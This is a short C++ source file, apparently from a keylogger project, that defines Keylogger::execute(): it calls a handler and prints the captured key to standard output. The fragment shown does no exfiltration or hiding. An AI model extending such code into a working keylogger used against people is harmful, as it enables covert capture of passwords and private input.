#include "keylogger.hpp"

#include <iostream>

namespace kl {

void Keylogger::execute() {
  handler_.handle();
  std::cout << handler_.get_key() << std::endl;
}

}
